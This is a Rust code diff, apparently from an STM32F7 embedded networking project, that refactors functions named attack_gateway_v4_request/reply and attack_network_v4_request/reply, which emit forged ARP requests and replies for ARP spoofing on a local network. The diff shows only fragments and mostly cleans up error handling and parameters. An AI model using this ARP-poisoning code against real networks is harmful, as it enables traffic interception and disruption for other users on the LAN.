@@ -3,7 +3,7 @@ use alloc::collections::BTreeMap;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
 use smoltcp::iface::EthernetInterface;
-use smoltcp::phy::{Device, RxToken, TxToken};
+use smoltcp::phy::{Device, RxToken};
 use smoltcp::time::Instant;
 use smoltcp::wire::*;
 use stm32f7_discovery::{ethernet::EthernetDevice, system_clock};
@@ -63,7 +63,7 @@ pub fn request(
     eth_addr: EthernetAddress,
     addr: Ipv4Address,
 ) -> Result<bool, String> {
-    let mut arp_req = ArpRepr::EthernetIpv4 {
+    let arp_req = ArpRepr::EthernetIpv4 {
         operation: ArpOperation::Request,
         source_hardware_addr: eth_addr,
         source_protocol_addr: Ipv4Address::new(0, 0, 0, 0),
@@ -92,7 +92,7 @@ pub fn request(
             arp_req.emit(&mut packet);
         },
     ) {
-        Ok(x) => {}
+        Ok(_) => {}
         Err(x) => return Err(x.to_string()),
     };
     let mut tries = 0;
@@ -110,11 +110,7 @@ pub fn request(
         match rx_token.consume(Instant::from_millis(system_clock::ms() as i64), |frame| {
             process_arp(eth_addr, &frame)
         }) {
-            Ok(ArpRepr::EthernetIpv4 {
-                source_hardware_addr,
-                source_protocol_addr,
-                ..
-            }) => return Ok(false),
+            Ok(ArpRepr::EthernetIpv4 { .. }) => return Ok(false),
             Ok(_) => {}
             Err(::smoltcp::Error::Unrecognized) => {}
             Err(_) => {}
@@ -205,22 +201,10 @@ pub fn get_neighbors_v4(
 pub fn attack_gateway_v4_request<'b, 'c, 'e, DeviceT>(
     iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
     eth_addr: EthernetAddress,
+    gateway: Ipv4Address,
 ) where
     DeviceT: for<'d> Device<'d>,
 {
-    let mut gateway = Ipv4Address::new(192, 168, 1, 1);
-
-    iface.routes_mut().update(|routes_map| {
-        routes_map
-            .get(&IpCidr::new(Ipv4Address::UNSPECIFIED.into(), 0))
-            .map(|default_route| {
-                //gateway = default_route.via_router;
-                if let IpAddress::Ipv4(x) = default_route.via_router {
-                    gateway = x
-                }
-            });
-    });
-
     let arp_reqest = ArpRepr::EthernetIpv4 {
         operation: ArpOperation::Request,
         source_hardware_addr: eth_addr,
@@ -238,7 +222,7 @@ pub fn attack_gateway_v4_request<'b, 'c, 'e, DeviceT>(
         None => return, // TODO "No tx descriptor available"
     };
 
-    match dispatch_ethernet(
+    dispatch_ethernet(
         eth_addr,
         tx_token,
         Instant::from_millis(system_clock::ms() as i64),
@@ -250,10 +234,7 @@ pub fn attack_gateway_v4_request<'b, 'c, 'e, DeviceT>(
             let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
             arp_reqest.emit(&mut packet);
         },
-    ) {
-        Ok(x) => x,
-        Err(_) => (),
-    }
+    ).unwrap_or(());
 }
 
 pub fn attack_network_v4_request<'b, 'c, 'e, DeviceT>(
@@ -281,7 +262,7 @@ pub fn attack_network_v4_request<'b, 'c, 'e, DeviceT>(
             None => return, // TODO "No tx descriptor available"
         };
 
-        match dispatch_ethernet(
+        dispatch_ethernet(
             eth_addr,
             tx_token,
             Instant::from_millis(system_clock::ms() as i64),
@@ -293,32 +274,17 @@ pub fn attack_network_v4_request<'b, 'c, 'e, DeviceT>(
                 let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
                 arp_reqest.emit(&mut packet);
             },
-        ) {
-            Ok(x) => x,
-            Err(_) => (),
-        }
+        ).unwrap_or(());
     }
 }
 
 pub fn attack_gateway_v4_reply<'b, 'c, 'e, DeviceT>(
     iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
     eth_addr: EthernetAddress,
+    gateway: Ipv4Address,
 ) where
     DeviceT: for<'d> Device<'d>,
 {
-    let mut gateway = Ipv4Address::new(192, 168, 1, 1);
-
-    iface.routes_mut().update(|routes_map| {
-        routes_map
-            .get(&IpCidr::new(Ipv4Address::UNSPECIFIED.into(), 0))
-            .map(|default_route| {
-                //gateway = default_route.via_router;
-                if let IpAddress::Ipv4(x) = default_route.via_router {
-                    gateway = x
-                }
-            });
-    });
-
     let arp_reply = ArpRepr::EthernetIpv4 {
         operation: ArpOperation::Reply,
         source_hardware_addr: eth_addr,
@@ -336,7 +302,7 @@ pub fn attack_gateway_v4_reply<'b, 'c, 'e, DeviceT>(
         None => return, // TODO "No tx descriptor available"
     };
 
-    match dispatch_ethernet(
+    dispatch_ethernet(
         eth_addr,
         tx_token,
         Instant::from_millis(system_clock::ms() as i64),
@@ -348,10 +314,7 @@ pub fn attack_gateway_v4_reply<'b, 'c, 'e, DeviceT>(
             let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
             arp_reply.emit(&mut packet);
         },
-    ) {
-        Ok(x) => x,
-        Err(_) => (),
-    }
+    ).unwrap_or(());
 }
 
 pub fn attack_network_v4_reply<'b, 'c, 'e, DeviceT>(
@@ -379,7 +342,7 @@ pub fn attack_network_v4_reply<'b, 'c, 'e, DeviceT>(
             None => return, // TODO "No tx descriptor available"
         };
 
-        match dispatch_ethernet(
+        dispatch_ethernet(
             eth_addr,
             tx_token,
             Instant::from_millis(system_clock::ms() as i64),
@@ -391,10 +354,7 @@ pub fn attack_network_v4_reply<'b, 'c, 'e, DeviceT>(
                 let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
                 arp_reply.emit(&mut packet);
             },
-        ) {
-            Ok(x) => x,
-            Err(_) => (),
-        }
+        ).unwrap_or(());
     }
 }
 
